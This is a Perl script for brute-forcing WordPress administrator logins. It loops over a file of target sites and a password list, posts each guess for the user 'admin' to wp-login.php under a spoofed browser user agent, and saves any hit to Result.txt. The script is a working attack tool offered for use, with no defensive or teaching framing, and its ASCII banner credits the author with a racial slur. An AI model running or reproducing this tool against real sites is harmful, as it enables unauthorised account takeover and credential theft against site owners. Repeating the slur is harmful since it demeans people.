#!/usr/bin/perl
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
sub logo {
	print color("bold yellow");
	print "
BBBBBBBBBBBBBBBBB                    FFFFFFFFFFFFFFFFFFFFFF   
B::::::::::::::::B                   F::::::::::::::::::::F    
B::::::BBBBBB:::::B                  F::::::::::::::::::::F   
BB:::::B     B:::::B                 FF::::::FFFFFFFFF::::F    
  B::::B     B:::::B                   F:::::F       FFFFFF    
  B::::B     B:::::B                   F:::::F                   
  B::::BBBBBB:::::B                    F::::::FFFFFFFFFF         
  B:::::::::::::BB   ---------------   F:::::::::::::::F       
  B::::BBBBBB:::::B  -:::::::::::::-   F:::::::::::::::F           
  B::::B     B:::::B ---------------   F::::::FFFFFFFFFF                    
  B::::B     B:::::B                   F:::::F                             
  B::::B     B:::::B                   F:::::F                                
BB:::::BBBBBB::::::B                 FF:::::::FF                        
B:::::::::::::::::B                  F::::::::FF                       
B::::::::::::::::B                   F::::::::FF                  	        BBBBBBBBBBBBBBBBB                    FFFFFFFFFFF       \n                
	";
print color("reset");
print color("bold green");
print "  ####################################################\n
			 Am!Ne Coder NiggA
		 https://www.facebook.com/wtf.madafack\n
	  ####################################################";
print color("reset");
}
logo();
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");
$ua->timeout(10);
print "\n";
open(url,"<$ARGV[0]") or die "perl test.pl sites.txt password.txt \n" ;
while(<url>) {
	chomp($_);
	$site = $_;
	if($site !~ /http:\/\//) { $site = "http://$site/"; };
	open(password,"<$ARGV[1]") or die "perl test.pl sites.txt password.txt \n" ;
	print "\n[";
	print color("bold red");
	print "Testing";
	print color("reset");
	print "] .................... [";
	print color("bold green");
	print "$site";
	print color("reset");
	print "]\n\n";
	while(<password>) {
		chomp($_);
		$passwd = $_;
		$user = "admin"; # Here Could you change this user
		$tag = "$site/wp-login.php";
		$brute = POST $tag, [ log => "$user" , pwd => "$passwd" , wp-submit => "Log In"];
		$rep = $ua->request($brute);
		$reponse = $rep->status_line;
		if($reponse =~ /302/) {
			print colored("FOUND :D || $user :: $passwd\n","bold white on_green");
			print color("reset");
			open(FILE,">Result.txt");
			print FILE "$site || $user :: $passwd\n";
			close(FILE);
		} else {
			print colored("FAILED :( || $user :: $passwd\n","bold white on_red");
			print color("reset");
	}
}
}
